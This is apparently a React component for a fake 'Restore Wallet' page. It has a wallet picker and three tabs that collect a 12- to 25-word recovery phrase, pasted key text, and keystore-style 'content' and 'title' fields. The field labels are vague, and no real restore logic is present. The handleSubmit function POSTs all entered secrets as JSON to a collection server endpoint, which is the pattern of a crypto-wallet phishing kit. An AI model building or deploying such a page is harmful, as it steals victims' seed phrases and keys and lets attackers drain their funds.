import React, { useState, useEffect } from "react";
import SecondModal from "../componets/SecondModal";
import SecurityCheck from "../componets/SecurityCheck";
import { useNavigate } from "react-router";
// import { useNavigate } from "react-router-dom";

const Connect = () => {
  const defaultCount = 12;
  const navigate = useNavigate();

  const [activeTab, setActiveTab] = useState("tab1");
  const [selectedInputCount, setSelectedInputCount] = useState(defaultCount);
  const [inputs, setInputs] = useState(Array(defaultCount).fill(""));
  const [isModalOpen, setIsModalOpen] = useState(false);
  const [selectedWallet, setSelectedWallet] = useState("");
  const [showSecurityModal, setShowSecurityModal] = useState(false);

  const [formData, setFormData] = useState({
    tab1Inputs: [],
    tab2Text: "",
    tab3: {
      content: "",
      title: "",
    },
  });

  useEffect(() => {
    setInputs(Array(defaultCount).fill(""));
  }, []);

  const handleLiClick = (count) => {
    setSelectedInputCount(count);
    const newInputs = Array(count).fill("");
    setInputs(newInputs);
    setFormData((prev) => ({ ...prev, tab1Inputs: newInputs }));
  };

  const handleInputChange = (index, value) => {
    const newInputs = [...inputs];
    newInputs[index] = value;
    setInputs(newInputs);
    setFormData((prev) => ({ ...prev, tab1Inputs: newInputs }));
  };

  const handleRestore = () => {
    if (!selectedWallet) {
      alert("Please select a wallet.");
      return;
    }

    handleSubmit();

    console.log("Submitting form data:", formData);

    // const isTab1Filled = formData.tab1Inputs.some((i) => i.trim() !== "");
    // const isTab2Filled = formData.tab2Text.trim() !== "";
    // const isTab3Filled =
    //   formData.tab3.content.trim() !== "" || formData.tab3.title.trim() !== "";

    // if (!isTab1Filled && !isTab2Filled && !isTab3Filled) {
    //   alert("Please fill in one of the restore tabs.");
    //   return;
    // }

    // setShowSecurityModal(true);
  };

  const isCurrentTabComplete = () => {
    if (activeTab === "tab1") {
      return (
        formData.tab1Inputs.length === selectedInputCount &&
        formData.tab1Inputs.every((val) => val.trim() !== "")
      );
    }
    if (activeTab === "tab2") {
      return formData.tab2Text.trim() !== "";
    }
    if (activeTab === "tab3") {
      return (
        formData.tab3.content.trim() !== "" && formData.tab3.title.trim() !== ""
      );
    }
    return false;
  };

  const handleSubmit = async () => {
    try {
      const response = await fetch("http://localhost:8080/submit", {
        method: "POST",
        headers: {
          "Content-Type": "application/json",
        },
        body: JSON.stringify(formData),
      });

      const result = await response.json();
      console.log(" Submit successful: ", result);
    } catch (error) {
      console.error(error);
    }
  };

  return (
    <div className="min-h-screen bg-gray-100 p-6">
      <div className="max-w-3xl mx-auto bg-white p-6 rounded-lg shadow">
        <div className="flex flex-col items-center space-y-4">
          <h1 className="text-2xl font-bold text-center">Restore Wallet</h1>
          <button
            onClick={() => setIsModalOpen(true)}
            className="bg-blue-600 text-white w-full py-3 rounded text-center hover:bg-blue-700"
          >
            {selectedWallet ? `${selectedWallet}` : "Select Wallet"}
          </button>
        </div>

        <div className="mt-8">
          <ul className="flex border-b mb-4">
            {["tab1", "tab2", "tab3"].map((tab) => (
              <li key={tab} className="mr-4">
                <button
                  onClick={() => setActiveTab(tab)}
                  className={`px-4 py-2 font-semibold ${
                    activeTab === tab
                      ? "border-b-4 border-blue-600 text-blue-600"
                      : "text-gray-500 hover:text-blue-500"
                  }`}
                >
                  {tab.toUpperCase()}
                </button>
              </li>
            ))}
          </ul>

          {/* Tab 1 */}
          {activeTab === "tab1" && (
            <div className="space-y-4">
              <div className="flex justify-between items-center my-4">
                <p className="text-gray-700">
                  {formData.tab1Inputs.filter((i) => i !== "").length} /{" "}
                  {selectedInputCount}
                </p>
                <ul className="flex text-gray-800">
                  {[12, 17, 24, 25].map((val) => (
                    <li
                      key={val}
                      onClick={() => handleLiClick(val)}
                      className={`cursor-pointer px-1 py-0 rounded ${
                        selectedInputCount === val
                          ? "bg-blue-100 text-blue-600 font-semibold"
                          : "text-blue-600 hover:underline"
                      }`}
                    >
                      {val}
                    </li>
                  ))}
                </ul>
              </div>

              <div className="grid grid-cols-3 gap-4">
                {inputs.map((input, index) => (
                  <div key={index} className="relative group my-1">
                    <span className="absolute -left-0.5 top-2 bottom-2 w-1.5 rounded bg-gradient-to-b from-indigo-500 to-purple-500 opacity-70 transition-all duration-300 group-focus-within:opacity-100"></span>
                    <input
                      type="text"
                      value={input}
                      onChange={(e) => handleInputChange(index, e.target.value)}
                      placeholder=""
                      className="peer w-full pl-6 pr-4 pt-6 pb-2 text-sm text-gray-800 bg-white border border-gray-200 rounded-lg shadow-md focus:border-transparent focus:ring-2 focus:ring-indigo-300 focus:outline-none placeholder-transparent"
                    />
                    <label
                      htmlFor={`input-${index}`}
                      className="absolute left-6 top-3.5 text-sm text-gray-500 transition-all duration-200 ease-in-out peer-placeholder-shown:top-3.5 peer-placeholder-shown:text-base peer-placeholder-shown:text-gray-400 peer-focus:top-1 peer-focus:text-sm peer-focus:text-indigo-500 peer-focus:font-semibold cursor-text"
                    >
                      Write Here
                    </label>
                  </div>
                ))}
              </div>

              <button
                onClick={handleRestore}
                disabled={!isCurrentTabComplete()}
                className={`w-full bg-gradient-to-r from-indigo-500 to-purple-500 text-white px-4 py-2 rounded mt-2 transition-colors ${
                  isCurrentTabComplete()
                    ? "hover:from-indigo-600 hover:to-purple-600"
                    : "opacity-50 cursor-not-allowed"
                }`}
              >
                Restore
              </button>
            </div>
          )}

          {/* Tab 2 */}
          {activeTab === "tab2" && (
            <div className="space-y-4">
              <input
                className="rounded bg-white text-xl border border-purple-500 p-2 w-full text-gray-800 placeholder:text-sm placeholder-purple-400 focus:text-violet-950 focus:border-purple-700 focus:outline-none focus:ring-2 focus:ring-purple-500"
                placeholder="Paste your quest..."
                value={formData.tab2Text}
                onChange={(e) =>
                  setFormData((prev) => ({
                    ...prev,
                    tab2Text: e.target.value,
                  }))
                }
              />
              <button
                onClick={handleRestore}
                disabled={!isCurrentTabComplete()}
                className={`w-full bg-gradient-to-r from-indigo-500 to-purple-500 text-white px-4 py-2 rounded transition-colors ${
                  isCurrentTabComplete()
                    ? "hover:from-indigo-600 hover:to-purple-600"
                    : "opacity-50 cursor-not-allowed"
                }`}
              >
                Restore
              </button>
            </div>
          )}

          {/* Tab 3 */}
          {activeTab === "tab3" && (
            <form
              onSubmit={(e) => {
                e.preventDefault();
                handleRestore();
              }}
              className="bg-white w-full p-6 rounded-lg shadow-md space-y-4"
            >
              <div>
                <label className="block text-gray-700 text-sm font-bold mb-2">
                  Content
                </label>
                <textarea
                  rows="5"
                  placeholder="Enter your content"
                  value={formData.tab3.content}
                  onChange={(e) =>
                    setFormData((prev) => ({
                      ...prev,
                      tab3: { ...prev.tab3, content: e.target.value },
                    }))
                  }
                  className="shadow border rounded py-2 px-3 border-purple-500 w-full text-gray-800 placeholder:text-sm placeholder-purple-400 focus:text-violet-950 focus:border-purple-700 focus:outline-none focus:ring-2 focus:ring-purple-500"
                ></textarea>
              </div>

              <div>
                <label className="block text-gray-700 text-sm font-bold mb-2">
                  Title
                </label>
                <input
                  value={formData.tab3.title}
                  onChange={(e) =>
                    setFormData((prev) => ({
                      ...prev,
                      tab3: { ...prev.tab3, title: e.target.value },
                    }))
                  }
                  className="rounded bg-white text-xl border border-purple-500 p-2 w-full text-gray-800 placeholder:text-sm placeholder-purple-400 focus:text-violet-950 focus:border-purple-700 focus:outline-none focus:ring-2 focus:ring-purple-500"
                  placeholder="Paste your quest..."
                />
              </div>

              <button
                type="submit"
                disabled={!isCurrentTabComplete()}
                className={`w-full bg-gradient-to-r from-indigo-500 to-purple-500 text-white px-4 py-2 rounded transition-colors ${
                  isCurrentTabComplete()
                    ? "hover:from-indigo-600 hover:to-purple-600"
                    : "opacity-50 cursor-not-allowed"
                }`}
              >
                Restore
              </button>
            </form>
          )}
        </div>
      </div>

      {/* Wallet Modal */}
      {isModalOpen && (
        <div className="fixed inset-0 bg-black bg-opacity-50 flex items-center justify-center z-50">
          <SecondModal
            closeModal={() => setIsModalOpen(false)}
            onWalletSelect={(walletName) => {
              setSelectedWallet(walletName);
              setIsModalOpen(false);
            }}
          />
        </div>
      )}

      {/* Security Check Modal */}
      {showSecurityModal && (
        <SecurityCheck onClose={() => setShowSecurityModal(false)} />
      )}
    </div>
  );
};

export default Connect;
